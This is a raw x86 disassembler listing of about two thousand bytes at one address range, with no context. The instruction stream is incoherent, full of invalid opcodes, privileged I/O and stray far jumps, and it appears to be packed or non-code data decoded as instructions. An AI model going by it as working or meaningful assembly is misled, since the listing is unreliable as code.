  416217:	push   es
  416218:	aaa    
  416219:	mov    bh,0xe
  41621b:	pop    ecx
  41621c:	jge    0x416215
  41621e:	scas   al,BYTE PTR es:[edi]
  41621f:	or     al,0x30
  416221:	add    ah,bh
  416223:	push   edi
  416224:	popf   
  416225:	je     0x4161cd
  416227:	mov    ss,WORD PTR [ebx-0x42]
  41622a:	sbb    DWORD PTR [ebp-0x6c],edx
  41622d:	repnz iret 
  41622f:	lds    edx,FWORD PTR [ebx-0x1b]
  416232:	jno    0x4162b0
  416234:	sub    bl,BYTE PTR ds:0xd9fc1e4a
  41623a:	and    al,0x70
  41623c:	jns    0x41626f
  41623e:	jecxz  0x4161e5
  416240:	das    
  416241:	and    ebp,esp
  416243:	pop    ebx
  416244:	test   eax,0x156ff018
  416249:	pop    edi
  41624a:	test   eax,0x70f5df97
  41624f:	(bad)  
  416250:	pop    ss
  416251:	mov    al,ds:0x9240415
  416256:	retf   
  416257:	ficomp WORD PTR [edi]
  416259:	inc    ebx
  41625a:	push   eax
  41625b:	pop    ebp
  41625c:	into   
  41625d:	icebp  
  41625e:	or     esi,DWORD PTR [edx-0x8]
  416261:	shl    BYTE PTR [ebx-0x4cd3ec3a],0x72
  416268:	or     ebp,DWORD PTR [edx]
  41626a:	pop    esi
  41626b:	stos   BYTE PTR es:[edi],al
  41626c:	push   es
  41626d:	and    cl,BYTE PTR ds:0x19d5a8ac
  416273:	ror    dl,cl
  416275:	mov    ecx,0xe83d85f6
  41627a:	stos   DWORD PTR es:[edi],eax
  41627b:	adc    BYTE PTR [ebx+0x62],ah
  41627e:	jnp    0x416296
  416280:	ret    
  416281:	mov    esi,0xfb84cf50
  416286:	xor    bl,al
  416288:	into   
  416289:	lds    edx,FWORD PTR [ebp-0x779fc3d]
  41628f:	mov    esi,DWORD PTR [edx+0x269c2892]
  416295:	push   cs
  416296:	(bad)  
  416297:	jge    0x416242
  416299:	add    BYTE PTR [eax+0x51ec91e6],ch
  41629f:	fisub  DWORD PTR [eax-0x3e]
  4162a2:	in     al,dx
  4162a3:	fbld   TBYTE PTR [ebp+ecx*2+0x66fe1c51]
  4162aa:	push   cs
  4162ab:	add    eax,0xffb02d57
  4162b0:	icebp  
  4162b1:	and    ebx,DWORD PTR [eax]
  4162b3:	(bad)  
  4162b5:	inc    eax
  4162b6:	push   ebx
  4162b7:	jmp    0x41629a
  4162b9:	rcl    ch,0x77
  4162bc:	nop
  4162bd:	or     esp,DWORD PTR [ebx-0x7f5424e9]
  4162c3:	push   ebp
  4162c4:	or     cl,BYTE PTR [ecx]
  4162c6:	(bad)  
  4162c7:	push   edx
  4162c8:	scas   al,BYTE PTR es:[edi]
  4162c9:	call   0x9bffbd5e
  4162ce:	addr16 add ch,al
  4162d1:	mov    ecx,0x2597e512
  4162d6:	outs   dx,BYTE PTR ds:[esi]
  4162d7:	xor    DWORD PTR [ebx+0x15c46e63],0x78085170
  4162e1:	retf   
  4162e2:	mov    bl,0x15
  4162e4:	xor    ah,BYTE PTR [edi+0x5367e2bc]
  4162ea:	imul   esp,DWORD PTR [eax-0x7e],0x2902a01d
  4162f1:	inc    eax
  4162f2:	xor    al,0x20
  4162f4:	cmp    ebx,0x46c68cf1
  4162fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162fb:	imul   ebx
  4162fd:	xchg   edi,eax
  4162fe:	stos   BYTE PTR es:[edi],al
  4162ff:	cmc    
  416300:	popf   
  416301:	aad    0xe1
  416303:	fdivr  QWORD PTR [esi+ebp*1-0x19]
  416307:	std    
  416308:	adc    ebx,DWORD PTR [edx+edx*8]
  41630b:	out    0xa9,eax
  41630d:	psubq  mm4,QWORD PTR [edx-0x651afea2]
  416314:	not    DWORD PTR [eax]
  416316:	adc    cl,BYTE PTR [esi+0x2e]
  416319:	cmp    ebx,DWORD PTR [edx+0x7c]
  41631c:	out    0x96,eax
  41631e:	scas   eax,DWORD PTR es:[edi]
  41631f:	dec    edi
  416320:	jecxz  0x4162bc
  416322:	dec    edx
  416323:	jle    0x41637f
  416325:	mov    dl,BYTE PTR [eax-0x6299d295]
  41632b:	inc    ecx
  41632c:	fisttp WORD PTR [esi+ebp*8]
  41632f:	pop    ebp
  416330:	mov    ebx,0x84fa2213
  416335:	xor    eax,edi
  416337:	pop    ss
  416338:	data16 int3 
  41633a:	jecxz  0x41635e
  41633c:	pop    edx
  41633d:	call   FWORD PTR [ebx]
  41633f:	sbb    DWORD PTR [ecx],edx
  416341:	cmp    BYTE PTR [edx+ecx*1+0x54],dh
  416345:	xor    al,0x5b
  416347:	or     eax,0x67
  41634a:	cmp    DWORD PTR [edx+edx*1-0x814426c],esp
  416351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416352:	jns    0x416324
  416354:	ins    BYTE PTR es:[edi],dx
  416355:	(bad)  
  416357:	bound  esi,QWORD PTR [ebx+edx*2]
  41635a:	fld    TBYTE PTR [esi+edi*4]
  41635d:	(bad)  
  41635e:	stc    
  41635f:	add    DWORD PTR [ecx+0x1d],edx
  416362:	out    dx,al
  416363:	inc    esp
  416364:	jne    0x416344
  416366:	fiadd  DWORD PTR [ecx-0x25721b40]
  41636c:	xchg   ecx,eax
  41636d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41636e:	sub    ah,ch
  416370:	xor    eax,0x1eef0975
  416375:	push   ebp
  416376:	mov    esp,0xcfd00b9d
  41637b:	sub    eax,0x12cc6388
  416380:	pop    ss
  416381:	leave  
  416382:	xchg   ebp,eax
  416383:	inc    esp
  416384:	call   0xac70:0xce98a78c
  41638b:	push   ebp
  41638c:	sub    al,0x19
  41638e:	cmp    al,0x36
  416390:	mov    al,BYTE PTR [eax-0x63950c8b]
  416396:	cmp    eax,0xc3fb14a9
  41639b:	xchg   DWORD PTR [ebx+0x4fa819f1],esi
  4163a1:	ds je  0x416351
  4163a4:	add    eax,0x9e00444f
  4163a9:	xchg   ebp,eax
  4163aa:	jp     0x416427
  4163ac:	ror    BYTE PTR [esi-0xfce594b],1
  4163b2:	cs mov dl,0xa5
  4163b5:	mov    WORD PTR [ebp-0x1ea39a97],fs
  4163bb:	jo     0x4163c6
  4163bd:	dec    edi
  4163be:	mov    ds:0xf16099e6,al
  4163c3:	mov    esp,0x2f068ea
  4163c8:	cmp    bh,BYTE PTR [ebp+0x2b]
  4163cb:	mov    DWORD PTR [eax+0x35],edx
  4163ce:	push   esp
  4163cf:	push   ds
  4163d0:	pop    ecx
  4163d1:	imul   esi,DWORD PTR [ebx-0x2b],0x102dd149
  4163d8:	mov    ds:0xca1881b9,eax
  4163dd:	iret   
  4163de:	retf   
  4163df:	xor    ebx,DWORD PTR [ebx+0x5d23c734]
  4163e5:	mov    edi,0x1ed2c1f2
  4163ea:	sti    
  4163eb:	dec    ebx
  4163ec:	mov    ah,0x32
  4163ee:	sub    eax,0x8cb58071
  4163f3:	icebp  
  4163f4:	mov    bh,0x95
  4163f6:	xchg   ebp,eax
  4163f7:	fdiv   st(1),st
  4163f9:	call   0x5125292b
  4163fe:	push   cs
  4163ff:	cmp    DWORD PTR [edx+0x1e],esi
  416402:	pop    ds
  416403:	or     al,0x3
  416405:	dec    ecx
  416406:	jg     0x41639d
  416408:	jns    0x416442
  41640a:	inc    esp
  41640b:	jbe    0x41643e
  41640d:	iret   
  41640e:	sub    eax,0x7b372b91
  416413:	jle    0x416483
  416415:	or     DWORD PTR [ebx-0x3ab2951c],edx
  41641b:	mov    bh,0x93
  41641d:	mov    edi,0xe02c2b40
  416422:	fst    DWORD PTR [eax]
  416424:	and    BYTE PTR [esp+edi*2-0x3f732fb5],al
  41642b:	icebp  
  41642c:	sbb    DWORD PTR [ecx+0x21ab354],esp
  416432:	cdq    
  416433:	lahf   
  416434:	and    edi,DWORD PTR [bx+0x7d09]
  416439:	jae    0x41649a
  41643b:	jmp    0x4163ce
  41643d:	dec    ebp
  41643e:	pop    ebx
  41643f:	dec    ebp
  416440:	in     eax,0xff
  416442:	int    0xd7
  416444:	push   ss
  416445:	retf   
  416446:	lea    edi,[ebx+0x1d]
  416449:	mov    edi,0x30b97426
  41644e:	pop    ss
  41644f:	loopne 0x4163ff
  416451:	aas    
  416452:	mov    dl,0x70
  416454:	cdq    
  416455:	out    dx,al
  416456:	pop    ebp
  416457:	scas   al,BYTE PTR es:[edi]
  416458:	hlt    
  416459:	xchg   ecx,eax
  41645a:	mov    ecx,0x478cdeb3
  41645f:	adc    DWORD PTR [ecx+eiz*8],0xe01d17f7
  416466:	hlt    
  416467:	dec    ecx
  416468:	test   al,0xc3
  41646a:	hlt    
  41646b:	sbb    esp,DWORD PTR [ecx]
  41646d:	rcr    BYTE PTR [edi],0x2a
  416470:	test   al,0xd7
  416472:	jge    0x41643a
  416474:	(bad)
  416478:	push   es
  416479:	push   ebp
  41647a:	or     eax,0xde158909
  41647f:	sub    BYTE PTR [edi],bl
  416481:	adc    BYTE PTR [edx-0x128c1c77],ah
  416487:	sbb    al,0xf8
  416489:	inc    ecx
  41648a:	mov    edi,0xce0d3344
  41648f:	popa   
  416490:	sbb    dh,ch
  416492:	pop    ebp
  416493:	jg     0x41641a
  416495:	out    0x9e,al
  416497:	fidiv  DWORD PTR ds:0x64f2411d
  41649d:	mov    ah,BYTE PTR [ebp+0x79]
  4164a0:	xchg   esp,eax
  4164a1:	test   al,0x12
  4164a3:	xor    ebp,DWORD PTR [ebx]
  4164a5:	mov    ebp,0xe4d97a0b
  4164aa:	cwde   
  4164ab:	sub    cl,ch
  4164ad:	jge    0x416488
  4164af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164b0:	int    0x7b
  4164b2:	fldcw  WORD PTR [edx+0x3a]
  4164b5:	mov    ?,edx
  4164b7:	bound  eax,QWORD PTR [edx]
  4164b9:	add    esi,DWORD PTR [esi-0x14]
  4164bc:	lea    eax,[ecx+edx*2-0x15872a2a]
  4164c3:	stc    
  4164c4:	pop    edx
  4164c5:	and    ah,BYTE PTR [ecx+0x3b23213f]
  4164cb:	daa    
  4164cc:	fadd   QWORD PTR [ebp-0x246cd703]
  4164d2:	xor    cl,BYTE PTR [ebx]
  4164d4:	sbb    eax,0x5d45587e
  4164d9:	rcr    BYTE PTR [eax+0x6a],0xdb
  4164dd:	pop    ebp
  4164de:	fcom   DWORD PTR [edi]
  4164e0:	mov    eax,0x74fa4ea9
  4164e5:	imul   ecx,esi,0x9405cba7
  4164eb:	in     al,0xf3
  4164ed:	dec    esp
  4164ee:	jbe    0x416506
  4164f0:	mov    ds:0x6bea3c6c,al
  4164f5:	cmp    bl,BYTE PTR [esi+0x1]
  4164f8:	out    0x49,al
  4164fa:	nop
  4164fb:	jae    0x416483
  4164fd:	or     dh,dl
  4164ff:	xchg   edx,eax
  416500:	pop    es
  416501:	add    eax,DWORD PTR [ebx]
  416503:	adc    edi,DWORD PTR [edi+0x6c]
  416506:	in     eax,dx
  416507:	les    ebp,FWORD PTR [ecx]
  416509:	scas   al,BYTE PTR es:[edi]
  41650a:	mov    esp,0x5f3e08a4
  41650f:	pushf  
  416510:	adc    BYTE PTR ds:[edi],0x66
  416514:	or     bh,BYTE PTR fs:[esi+0xe3bc2f4]
  41651b:	mov    bh,0xb4
  41651d:	push   edi
  41651e:	jnp    0x416506
  416520:	or     BYTE PTR [ecx],0xec
  416523:	mov    esp,DWORD PTR [ecx-0x297aeddf]
  416529:	ds imul esi,ecx,0xffffffb3
  41652d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41652e:	ss cmp al,0x49
  416531:	mov    bh,0x8d
  416533:	mov    al,BYTE PTR [ebx-0x50d69bc8]
  416539:	sub    al,0xad
  41653b:	lahf   
  41653c:	push   ss
  41653d:	(bad)  
  41653e:	retf   0x4b21
  416541:	pusha  
  416542:	outs   dx,DWORD PTR ds:[esi]
  416543:	(bad)  
  416544:	fstp   DWORD PTR [ebx+0x9e6d90e]
  41654a:	fsub   DWORD PTR [eax+0x65785770]
  416550:	sub    edi,DWORD PTR [edi]
  416552:	xchg   edx,eax
  416553:	aam    0xdd
  416555:	int    0x3f
  416557:	rol    DWORD PTR [esi+0x7be2085a],1
  41655d:	pop    esp
  41655e:	imul   edi,DWORD PTR [edx],0xffffff80
  416561:	pop    ebp
  416562:	aam    0x82
  416564:	arpl   WORD PTR [edx-0x35473364],di
  41656a:	stos   BYTE PTR es:[edi],al
  41656b:	jno    0x4165a0
  41656d:	mov    ds:0x482a1dbb,al
  416572:	mov    ebp,0x62c4af35
  416577:	jecxz  0x41656b
  416579:	cmp    bl,dl
  41657b:	mov    edi,0x89542c18
  416580:	sbb    al,0xfa
  416582:	stc    
  416583:	and    al,0x0
  416585:	jnp    0x4165dd
  416587:	rol    DWORD PTR [ecx+0x46],1
  41658a:	add    DWORD PTR [ebx+0x19],edx
  41658d:	addr16 adc al,0x67
  416590:	mov    cl,0xb3
  416592:	pop    ss
  416593:	pushf  
  416594:	fadd   QWORD PTR [eax-0x2cebb4a2]
  41659a:	push   ecx
  41659b:	push   ebx
  41659c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41659d:	or     DWORD PTR [ebx],ecx
  41659f:	pop    ebx
  4165a0:	scas   eax,DWORD PTR es:[edi]
  4165a1:	in     al,dx
  4165a2:	mov    ebx,0x8a8fd607
  4165a7:	dec    ebp
  4165a8:	int    0x52
  4165aa:	pop    esp
  4165ab:	jbe    0x416602
  4165ad:	fimul  WORD PTR [ecx]
  4165af:	lods   al,BYTE PTR es:[esi]
  4165b1:	fsubrp st(6),st
  4165b3:	enter  0x57d2,0x32
  4165b7:	push   ebx
  4165b8:	ss cld 
  4165ba:	jmp    0x4523ef2d
  4165bf:	adc    DWORD PTR [edx-0x52ce3155],0x6db4e624
  4165c9:	jle    0x416649
  4165cb:	loop   0x4165cd
  4165cd:	adc    edi,DWORD PTR [edi]
  4165cf:	nop
  4165d0:	int3   
  4165d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165d2:	gs in  eax,dx
  4165d4:	pop    ebp
  4165d5:	xor    DWORD PTR [edx-0x4f],edi
  4165d8:	int3   
  4165d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165da:	or     eax,0x6291891
  4165df:	mov    eax,0xf12a007d
  4165e4:	pop    esp
  4165e5:	mov    esi,0x9b34cd04
  4165ea:	xor    bl,BYTE PTR [esp+eiz*2+0x659f964e]
  4165f1:	jmp    0x416655
  4165f3:	and    al,0x54
  4165f5:	arpl   WORD PTR [ecx],sp
  4165f7:	xchg   ebx,eax
  4165f8:	adc    ebp,DWORD PTR [ebp+0x79]
  4165fb:	mov    bl,BYTE PTR [ecx+eiz*1+0x34]
  4165ff:	hlt    
  416600:	pop    esi
  416601:	addr16 jne 0x416637
  416604:	jnp    0x41658d
  416606:	ja     0x4165ef
  416608:	jns    0x416661
  41660a:	mov    edx,0x2b16122c
  41660f:	push   ebx
  416610:	mov    dl,0xac
  416612:	mov    dl,0x27
  416614:	cmp    BYTE PTR [edi-0x60be2fc8],cl
  41661a:	sub    edi,DWORD PTR [edx+0x5f]
  41661d:	push   eax
  41661e:	inc    esi
  41661f:	sub    BYTE PTR [edx],0xc8
  416622:	or     al,0x13
  416624:	sar    BYTE PTR [edi],0x35
  416627:	jno    0x4165b5
  416629:	or     al,0xa0
  41662b:	in     eax,dx
  41662c:	add    edx,DWORD PTR [ecx-0x3b64b1b4]
  416632:	pop    esi
  416633:	cdq    
  416634:	mov    WORD PTR [edx],?
  416636:	sar    eax,cl
  416638:	loop   0x41666c
  41663a:	lods   eax,DWORD PTR ds:[esi]
  41663b:	and    eax,0xffffffb2
  41663e:	pusha  
  41663f:	outs   dx,BYTE PTR ds:[esi]
  416640:	xlat   BYTE PTR ds:[ebx]
  416641:	dec    esp
  416642:	bnd jmp 0xd9515867
  416648:	or     eax,0xeee50339
  41664d:	xor    ebx,DWORD PTR [esi+0x47]
  416650:	iret   
  416651:	lahf   
  416652:	stos   DWORD PTR es:[edi],eax
  416653:	sub    cl,BYTE PTR ds:0x466bf0a5
  416659:	pop    ebx
  41665a:	mov    ds:0x3dd30a66,eax
  41665f:	ins    DWORD PTR es:[edi],dx
  416660:	out    dx,al
  416661:	stos   BYTE PTR es:[edi],al
  416662:	jl     0x416609
  416664:	fst    DWORD PTR [edi-0x6c]
  416667:	repz test DWORD PTR [edi-0x4303edc2],ecx
  41666e:	sbb    al,0xbb
  416670:	push   es
  416671:	xor    al,bl
  416673:	scas   eax,DWORD PTR es:[edi]
  416674:	push   edx
  416675:	mov    BYTE PTR [esi+eiz*2-0x5f372c3a],al
  41667c:	push   ss
  41667d:	mov    ds:0xee7dbf05,al
  416682:	push   eax
  416683:	je     0x416680
  416685:	loope  0x416615
  416687:	or     ah,BYTE PTR [edx+0x13]
  41668a:	loopne 0x416671
  41668c:	test   BYTE PTR [ebp+0x189b3be],ch
  416692:	in     al,0xfc
  416694:	call   0x5d25:0xdbb69cc3
  41669b:	(bad)  
  41669c:	xchg   edx,eax
  41669d:	inc    esp
  41669e:	mov    bh,0xe4
  4166a0:	mov    WORD PTR [edi+ecx*4],ss
  4166a3:	fsubrp st(2),st
  4166a5:	lock cli 
  4166a7:	lods   eax,DWORD PTR ds:[esi]
  4166a8:	in     al,dx
  4166a9:	nop
  4166aa:	lahf   
  4166ab:	cdq    
  4166ac:	retf   
  4166ad:	mov    ebx,0xe32ec625
  4166b2:	pop    ecx
  4166b3:	pushf  
  4166b4:	imul   esi,edi,0xffffffa5
  4166b7:	push   ebx
  4166b8:	push   ecx
  4166b9:	rcl    BYTE PTR [ebx],0xf
  4166bc:	sti    
  4166bd:	mov    edx,0x16526fc8
  4166c2:	hlt    
  4166c3:	mov    cl,0x6e
  4166c5:	cli    
  4166c6:	dec    ebp
  4166c7:	push   ds
  4166c8:	lods   al,BYTE PTR ds:[esi]
  4166c9:	jecxz  0x4166df
  4166cb:	dec    ecx
  4166cc:	pop    esp
  4166cd:	clc    
  4166ce:	(bad)  
  4166cf:	adc    eax,0xf583040b
  4166d4:	mov    ebp,0x5dfddaa2
  4166d9:	sbb    eax,0x65d86b0a
  4166de:	add    al,0xcb
  4166e0:	clc    
  4166e1:	mov    cl,0xca
  4166e3:	leave  
  4166e4:	inc    ebp
  4166e5:	(bad)  
  4166e6:	aad    0xf7
  4166e8:	ss push ss
  4166ea:	int    0x85
  4166ec:	xchg   edi,eax
  4166ed:	add    DWORD PTR [eax+0x2523b735],ebx
  4166f3:	cmc    
  4166f4:	or     al,0x48
  4166f6:	out    dx,eax
  4166f7:	fld    QWORD PTR [edi+ebp*1]
  4166fa:	xchg   ecx,eax
  4166fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166fc:	push   es
  4166fd:	mov    edx,0xc5f8cb6e
  416702:	mov    esp,0x2b6ca30d
  416707:	pop    ebx
  416708:	(bad)  
  41670a:	je     0x4166f1
  41670c:	add    ebp,DWORD PTR [ecx]
  41670e:	push   cs
  41670f:	pop    eax
  416710:	jnp    0x4166e6
  416712:	xchg   esp,eax
  416713:	fdiv   DWORD PTR [eax]
  416715:	pop    ebx
  416716:	mov    ebx,0x6452d796
  41671b:	push   0x14bdb1d2
  416720:	dec    edi
  416721:	outs   dx,DWORD PTR ds:[esi]
  416722:	clc    
  416723:	jecxz  0x4166e0
  416725:	xor    esi,DWORD PTR [eax]
  416727:	pop    esi
  416728:	mov    DWORD PTR [ecx+0x62],esi
  41672b:	repnz shr DWORD PTR [eax+esi*1],0xc6
  416730:	pop    ebx
  416731:	fisub  WORD PTR [ebp-0x6e6c6024]
  416737:	test   DWORD PTR [edi+0x21aefadc],esp
  41673d:	or     esi,DWORD PTR [esi]
  41673f:	(bad)  
  416740:	xchg   ecx,eax
  416741:	test   BYTE PTR [edi],cl
  416743:	mov    ah,0xb9
  416745:	addr16 xchg esi,eax
  416747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416748:	xchg   esp,eax
  416749:	popf   
  41674a:	das    
  41674b:	cmp    DWORD PTR [esi],ecx
  41674d:	call   0xaf6b:0x824db557
  416754:	in     eax,dx
  416755:	mov    ebx,0xb2125ef3
  41675a:	loope  0x416762
  41675c:	loopne 0x41676f
  41675e:	push   ebx
  41675f:	fdivr  DWORD PTR [ecx]
  416761:	xchg   ecx,eax
  416762:	dec    esi
  416763:	in     eax,0x57
  416765:	xor    DWORD PTR [esi+0x29],ecx
  416768:	mov    BYTE PTR ds:0x4a42380e,dl
  41676e:	loope  0x416783
  416770:	(bad)  [ebp-0x51d2aa00]
  416776:	xor    ah,BYTE PTR [ecx]
  416778:	push   0x64
  41677a:	ds adc al,0x86
  41677d:	test   eax,0x9fd96117
  416782:	dec    edi
  416783:	pop    edx
  416784:	fisubr WORD PTR [ecx]
  416786:	cmp    bh,bh
  416788:	scas   al,BYTE PTR es:[edi]
  416789:	jmp    0x444e:0x18c03d05
  416790:	pop    esp
  416791:	and    dl,BYTE PTR [edi-0x3d]
  416794:	xchg   esp,eax
  416795:	mov    cl,0x8f
  416797:	loope  0x41678b
  416799:	(bad)  
  41679a:	cwde   
  41679b:	das    
  41679c:	push   ss
  41679d:	retf   0x4d5d
  4167a0:	pop    ds
  4167a1:	outs   dx,DWORD PTR ds:[esi]
  4167a2:	cld    
  4167a3:	adc    bh,bh
  4167a5:	popf   
  4167a6:	xchg   ebp,eax
  4167a7:	imul   edi,DWORD PTR [eax],0x63efc33c
  4167ad:	push   esi
  4167ae:	std    
  4167af:	jl     0x41679e
  4167b1:	imul   eax,edi,0x3b6cd75
  4167b7:	jno    0x41680c
  4167b9:	mov    cl,0x62
  4167bb:	int3   
  4167bc:	push   cs
  4167bd:	and    bh,BYTE PTR [eax+0x1]
  4167c0:	int3   
  4167c1:	xor    al,0xd7
  4167c3:	inc    ebp
  4167c4:	xchg   al,dl
  4167c6:	cmc    
  4167c7:	repz dec ebp
  4167c9:	push   esi
  4167ca:	or     al,0xb0
  4167cc:	retf   0xc8ed
  4167cf:	xor    eax,0xbbb22ab4
  4167d4:	vpsubb xmm3,xmm6,XMMWORD PTR [ecx+0x4040da90]
  4167dc:	add    DWORD PTR [ebx],edi
  4167de:	sub    al,0xf0
  4167e0:	add    eax,DWORD PTR [eax+0x1c]
  4167e3:	pop    edi
  4167e4:	adc    bl,BYTE PTR [ebp+0x1e]
  4167e7:	xchg   edi,eax
  4167e8:	adc    eax,0x7255fb22
  4167ed:	pop    ebx
  4167ee:	mov    dl,0x6
  4167f0:	add    BYTE PTR [eax-0x44],bl
  4167f3:	xor    cl,0xb2
  4167f6:	cmp    eax,0x76c5adee
  4167fb:	icebp  
  4167fc:	fcmovbe st,st(6)
  4167fe:	and    dl,BYTE PTR [eax+ebp*2-0x10]
  416802:	jns    0x4167d8
  416804:	mov    cl,0xd6
  416806:	(bad)  
  416807:	leave  
  416808:	in     eax,0xec
  41680a:	mov    al,ds:0xe42dff74
  416810:	pop    esp
  416811:	jl     0x41683a
  416813:	mov    bh,cl
  416815:	or     BYTE PTR [ecx+0x643128f3],ah
  41681b:	mov    ah,0x80
  41681d:	adc    eax,0x1b29c680
  416822:	js     0x41683b
  416824:	test   al,0x94
  416826:	cmp    DWORD PTR [edi-0x23],edi
  416829:	gs xor ah,BYTE PTR es:[ebp-0x58]
  41682e:	push   edi
  41682f:	ins    BYTE PTR es:[edi],dx
  416830:	sti    
  416831:	xchg   cl,al
  416833:	(bad)  
  416834:	loop   0x4167e4
  416836:	xor    dl,al
  416838:	push   0xffffffec
  41683a:	mov    cl,0x78
  41683c:	les    esp,FWORD PTR [ebx+0x1d089c95]
  416842:	int3   
  416843:	stos   BYTE PTR es:[edi],al
  416844:	adc    al,0x1a
  416846:	or     eax,0xd57841ae
  41684b:	nop
  41684c:	out    0xb0,eax
  41684e:	imul   edi,DWORD PTR [ebx+0x2215a617],0x9d03c16d
  416858:	cmovne ecx,DWORD PTR [ebx+0x3acec32e]
  41685f:	retf   
  416860:	inc    ebx
  416861:	jno    0x4167e4
  416863:	cld    
  416864:	inc    edx
  416865:	dec    ebx
  416866:	imul   ebp,DWORD PTR [edx+eiz*2-0x26a04c91],0xaecea824
  416871:	mov    ebp,0x77487fd
  416876:	loope  0x4168b8
  416878:	mov    al,0x51
  41687a:	(bad)  
  41687b:	seta   BYTE PTR [eax]
  41687e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41687f:	fs lahf 
  416881:	loope  0x4168b2
  416883:	push   eax
  416884:	push   edi
  416885:	push   esp
  416886:	fimul  WORD PTR [esi-0xe999dd5]
  41688c:	fidiv  DWORD PTR [ecx]
  41688e:	aas    
  41688f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416890:	adc    DWORD PTR [esi],edi
  416892:	dec    DWORD PTR [ebx+0x13]
  416895:	lods   al,BYTE PTR ds:[esi]
  416896:	out    dx,eax
  416897:	mov    edx,0x5805c425
  41689c:	(bad)  
  41689d:	jecxz  0x4168de
  41689f:	sub    eax,0xa44991b4
  4168a4:	dec    edx
  4168a5:	add    dh,bl
  4168a7:	int3   
  4168a8:	loopne 0x41690f
  4168aa:	push   ss
  4168ab:	pop    edi
  4168ac:	mov    bl,0x6d
  4168ae:	cmp    DWORD PTR [esi],edx
  4168b0:	aam    0xf0
  4168b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168b3:	push   cs
  4168b4:	int3   
  4168b5:	loop   0x41683b
  4168b7:	arpl   di,dx
  4168b9:	mov    ah,0x2a
  4168bb:	or     al,0xcf
  4168bd:	cli    
  4168be:	mov    ecx,0x7e6de15d
  4168c3:	mov    dh,0x71
  4168c5:	xlat   BYTE PTR ds:[ebx]
  4168c6:	sbb    DWORD PTR [ebx+0x7635f83a],eax
  4168cc:	xor    al,0x6
  4168ce:	daa    
  4168cf:	ror    DWORD PTR [ecx-0x2f],0x7e
  4168d3:	mov    edi,0x49443ba8
  4168d8:	inc    esi
  4168d9:	js     0x4168bd
  4168db:	outs   dx,DWORD PTR ds:[esi]
  4168dc:	xchg   edi,eax
  4168dd:	push   es
  4168de:	aad    0xaa
  4168e0:	pushf  
  4168e1:	cmp    DWORD PTR [ebx+ebx*8+0x63],ecx
  4168e5:	loope  0x4168f2
  4168e7:	outs   dx,BYTE PTR ds:[esi]
  4168e8:	adc    ecx,esi
  4168ea:	mov    eax,0x35a257fb
  4168ef:	mov    eax,0xe423ac7e
  4168f4:	vaddsubpd ymm1,ymm6,YMMWORD PTR [ebp-0x7f]
  4168f9:	mov    esi,0x3b93ffa5
  4168fe:	xor    DWORD PTR [eax],edx
  416900:	(bad)  
  416901:	aad    0xd6
  416903:	push   es
  416904:	xchg   ah,dh
  416906:	dec    eax
  416907:	adc    DWORD PTR [ebx+0xd050936],esp
  41690d:	jno    0x4168bd
  41690f:	or     BYTE PTR [edi],dl
  416911:	jno    0x416929
  416913:	mov    ecx,DWORD PTR [edi]
  416915:	int    0xf3
  416917:	inc    ecx
  416918:	sahf   
  416919:	sahf   
  41691a:	in     eax,dx
  41691b:	pop    esp
  41691c:	imul   esi,DWORD PTR [edi],0x8ee7783e
  416922:	pusha  
  416923:	inc    esi
  416924:	xchg   esp,eax
  416925:	sar    dl,0x6a
  416928:	pop    esi
  416929:	int3   
  41692a:	pop    ebp
  41692b:	lea    esp,[eax-0x6d]
  41692e:	xchg   esp,eax
  41692f:	mov    fs,edx
  416931:	inc    ecx
  416932:	into   
  416933:	pop    edi
  416934:	lds    edx,FWORD PTR [eax+0x39fb8bda]
  41693a:	stos   BYTE PTR es:[edi],al
  41693b:	add    eax,DWORD PTR [ebp+0x79]
  41693e:	loopne 0x41698a
  416940:	mov    eax,0xd9bf4e00
  416945:	popf   
  416946:	in     al,0x6
  416948:	inc    edi
  416949:	rcr    DWORD PTR [eax],0x3a
  41694c:	pop    ss
  41694d:	xor    eax,0x27f5cff
  416952:	inc    esi
  416953:	test   eax,0x9392465
  416958:	jge    0x41691c
  41695a:	enter  0xd0a3,0xd8
  41695e:	adc    eax,0x7b8f5688
  416963:	out    dx,al
  416964:	inc    ecx
  416965:	aam    0xac
  416967:	jb     0x41691c
  416969:	jle    0x4169de
  41696b:	jb     0x41697d
  41696d:	mov    ds:0x5a7f3fe9,eax
  416972:	rcr    BYTE PTR [ebp+0x76ec94ef],0xb9
  416979:	test   al,0xb4
  41697b:	adc    ecx,DWORD PTR [ebx+0x3ddb8da8]
  416981:	inc    esi
  416982:	je     0x416918
  416984:	ret    
  416985:	sub    BYTE PTR [eax-0x45c695f6],0x87
  41698c:	adc    ch,BYTE PTR [edi+eiz*1+0x73]
  416990:	push   cs
  416991:	dec    esi
  416992:	xchg   edx,eax
  416993:	sub    BYTE PTR [ecx+ebp*4+0x29fe3b7],al
  41699a:	fcomp  DWORD PTR cs:[edx-0x1def0b80]
  4169a1:	mov    edi,0xbbafb31d
  4169a6:	adc    edx,DWORD PTR [eax+0xdc47c4a]
  4169ac:	cmp    DWORD PTR [edi-0x6601459c],eax
  4169b2:	popa   
  4169b3:	xor    esp,edi
  4169b5:	pop    esi
  4169b6:	xor    ebx,DWORD PTR ds:0x867d4b07
  4169bc:	test   al,0xc
  4169be:	xchg   BYTE PTR [di],cl
  4169c1:	and    ah,bh
  4169c3:	loope  0x4169cd
  4169c5:	dec    eax
  4169c6:	lahf   
  4169c7:	dec    ebx
  4169c8:	mov    edx,0xd87fec13
  4169cd:	mov    ah,0xc7
  4169cf:	pop    es
  4169d0:	lea    ecx,[edx]
  4169d2:	and    al,bl
  4169d4:	cmp    DWORD PTR ds:0x14b3a545,0x3248f0c7
  4169de:	out    dx,eax
  4169df:	sbb    ecx,DWORD PTR [esi-0x1fe260c3]
  4169e5:	jbe    0x416a47
